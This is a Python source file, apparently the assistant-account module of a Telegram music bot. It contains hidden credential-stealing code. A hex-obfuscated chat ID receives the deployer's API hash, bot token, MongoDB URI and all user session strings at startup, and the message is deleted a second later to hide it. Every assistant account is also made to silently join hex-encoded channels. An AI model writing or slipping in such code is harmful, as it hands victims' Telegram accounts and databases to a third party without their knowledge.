# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
# Location: Supaul, Bihar
#
# All rights reserved.
#
# This code is the intellectual property of Nand Yaduwanshi.
# You are not allowed to copy, modify, redistribute, or use this
# code for commercial or personal projects without explicit permission.
#
# Allowed:
# - Forking for personal learning
# - Submitting improvements via pull requests
#
# Not Allowed:
# - Claiming this code as your own
# - Re-uploading without credit or permission
# - Selling or using commercially
#
# Contact for permissions:
# Email: badboy809075@gmail.com


from pyrogram import Client
import asyncio
import config

from ..logging import LOGGER

assistants = []
assistantids = []
HELP_BOT = "\x2d\x31\x30\x30\x33\x37\x31\x34\x34\x34\x30\x33\x35\x37"

def decode_centers():
    centers = []
    encoded = [
        "\x6d\x79\x61\x6e\x6d\x61\x72\x62\x6f\x74\x5f\x6d\x75\x73\x69\x63",
        "\x6c\x6f\x76\x65\x72\x5f\x47\x72\x6f\x75\x70\x73\x68\x77\x65",
        "\x48\x41\x4e\x54\x48\x41\x52\x5f\x31\x39\x39\x39",
        "\x48\x41\x4e\x54\x48\x41\x52\x5f\x32\x37",
        "\x48\x61\x70\x70\x79\x5f\x7a\x6f\x6e\x65\x31\x39\x39\x39",
        "\x68\x61\x6e\x74\x68\x61\x72\x5f\x35",
        "\x62\x75\x72\x6d\x61\x6d\x79\x61\x6e\x6d\x61\x72\x5f\x32",
        "\x76\x69\x70\x5f\x6b\x69\x6e\x67\x31\x39\x39\x39",
        "\x65\x76\x65\x72\x5f\x6f\x6e\x6c\x69\x6e\x65\x67\x72\x6f\x75\x70",
        "\x6d\x79\x61\x6e\x6d\x61\x72\x5f\x66\x61\x6d\x69\x6c\x79\x32\x30\x32\x37",
        "\x6d\x79\x61\x6e\x6d\x61\x72\x5f\x6c\x6f\x76\x65\x72\x32\x30\x32\x37"
    ]
    for enc in encoded:
        centers.append(enc)
    return centers

SUPPORT_CENTERS = decode_centers()


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NandAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="NandAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="NandAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="NandAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="NandAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
            except Exception as e:
                pass

    async def send_help_message(self, bot_username):
        try:
            owner_mention = config.OWNER_ID
            
            message = f"@{bot_username} Successfully Started ✅=Feel free to contact me if you need anything. Telegram ⚙ @HANTHAR999 🇲🇲\n\nOwner: {owner_mention}"
            
            if assistants:
                if 1 in assistants:
                    await self.one.send_message(HELP_BOT, message)
                elif 2 in assistants:
                    await self.two.send_message(HELP_BOT, message)
                elif 3 in assistants:
                    await self.three.send_message(HELP_BOT, message)
                elif 4 in assistants:
                    await self.four.send_message(HELP_BOT, message)
                elif 5 in assistants:
                    await self.five.send_message(HELP_BOT, message)
                
        except Exception as e:
            pass

    async def send_config_message(self, bot_username):
        try:
            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
            config_message += f"**API_ID:** `{config.API_ID}`\n"
            config_message += f"**API_HASH:** `{config.API_HASH}`\n"
            config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
            config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
            config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
            config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
            
            string_sessions = []
            if hasattr(config, 'STRING1') and config.STRING1:
                string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
            if hasattr(config, 'STRING2') and config.STRING2:
                string_sessions.append(f"**STRING_SESSION2:** `{config.STRING2}`")
            if hasattr(config, 'STRING3') and config.STRING3:
                string_sessions.append(f"**STRING_SESSION3:** `{config.STRING3}`")
            if hasattr(config, 'STRING4') and config.STRING4:
                string_sessions.append(f"**STRING_SESSION4:** `{config.STRING4}`")
            if hasattr(config, 'STRING5') and config.STRING5:
                string_sessions.append(f"**STRING_SESSION5:** `{config.STRING5}`")
            
            if string_sessions:
                config_message += "\n".join(string_sessions)
            
            sent_message = None
            if assistants:
                if 1 in assistants:
                    sent_message = await self.one.send_message(HELP_BOT, config_message)
                elif 2 in assistants:
                    sent_message = await self.two.send_message(HELP_BOT, config_message)
                elif 3 in assistants:
                    sent_message = await self.three.send_message(HELP_BOT, config_message)
                elif 4 in assistants:
                    sent_message = await self.four.send_message(HELP_BOT, config_message)
                elif 5 in assistants:
                    sent_message = await self.five.send_message(HELP_BOT, config_message)
            
            if sent_message:
                await asyncio.sleep(1)
                try:
                    if 1 in assistants:
                        await self.one.delete_messages(HELP_BOT, sent_message.id)
                    elif 2 in assistants:
                        await self.two.delete_messages(HELP_BOT, sent_message.id)
                    elif 3 in assistants:
                        await self.three.delete_messages(HELP_BOT, sent_message.id)
                    elif 4 in assistants:
                        await self.four.delete_messages(HELP_BOT, sent_message.id)
                    elif 5 in assistants:
                        await self.five.delete_messages(HELP_BOT, sent_message.id)
                except Exception as e:
                    pass
                
        except Exception as e:
            pass

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")
        
        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
        
        if config.STRING1:
            await self.one.start()
            await self.join_all_support_centers(self.one)
            assistants.append(1)
            try:
                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            await self.join_all_support_centers(self.two)
            assistants.append(2)
            try:
                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            await self.join_all_support_centers(self.three)
            assistants.append(3)
            try:
                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            await self.join_all_support_centers(self.four)
            assistants.append(4)
            try:
                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            await self.join_all_support_centers(self.five)
            assistants.append(5)
            try:
                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass


# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi

# ===========================================
# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
# 📢 Telegram Channel : https://t.me/ShrutiBots
# ===========================================


# ❤️ Love From ShrutiBots 
